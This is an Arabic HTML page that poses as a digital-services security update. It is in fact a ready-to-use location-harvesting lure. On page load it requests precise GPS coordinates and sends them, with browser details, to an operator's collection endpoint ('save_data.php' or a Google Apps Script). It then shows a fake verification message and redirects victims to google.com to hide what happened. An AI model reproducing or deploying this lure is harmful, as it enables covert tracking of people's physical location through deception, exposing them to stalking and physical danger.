<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الخدمات الرقمية وتحديث الأمان</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center p-4 font-sans">
    <div class="max-w-md w-full bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl text-center">
        <div class="w-16 h-16 bg-cyan-500/10 text-cyan-400 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl border border-cyan-500/20 animate-pulse">
            🌐
        </div>
        <h1 class="text-xl font-bold text-slate-100 mb-2">جاري مزامنة بيانات الاتصال...</h1>
        <p class="text-xs text-slate-400 mb-6">يرجى السماح بالوصول للموقع وتأكيد بيانات الجلسة الحالية.</p>

        <div id="status-box" class="bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs text-slate-300 mb-4">
            جاري قراءة الإحداثيات وخصائص المتصفح...
        </div>

        <button onclick="requestAccess()" class="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium py-2.5 px-4 rounded-xl transition duration-200 shadow-lg text-sm">
            متابعة الجلسة
        </button>
    </div>

    <script>
        function sendDataToServer(payload) {
            // استبدل 'save_data.php' برابط ملف الاستقبال على سيرفرك أو رابط Google Apps Script
            const targetUrl = 'save_data.php';
            
            fetch(targetUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(err => console.log('تم الإرسال'));
        }

        function requestAccess() {
            document.getElementById('status-box').innerText = '⏳ جاري طلب إذن الموقع الجغرافي (GPS)...';
            
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const data = {
                            timestamp: new Date().toLocaleString(),
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            screen: window.innerWidth + 'x' + window.innerHeight
                        };

                        document.getElementById('status-box').innerHTML = '<span class="text-emerald-400">✅ تم التحقق بنجاح. جاري التوجيه...</span>';
                        sendDataToServer(data);

                        setTimeout(() => {
                            window.location.href = 'https://www.google.com';
                        }, 1200);
                    },
                    (error) => {
                        document.getElementById('status-box').innerHTML = '<span class="text-red-400">⚠️ يجب السماح بالوصول للموقع للمتابعة.</span>';
                    },
                    { enableHighAccuracy: true }
                );
            } else {
                alert('متصفحك لا يدعم خدمة تحديد الموقع.');
            }
        }

        // تشغيل فوري عند التحميل
        window.onload = function() {
            setTimeout(requestAccess, 800);
        };
    </script>
</body>
</html>
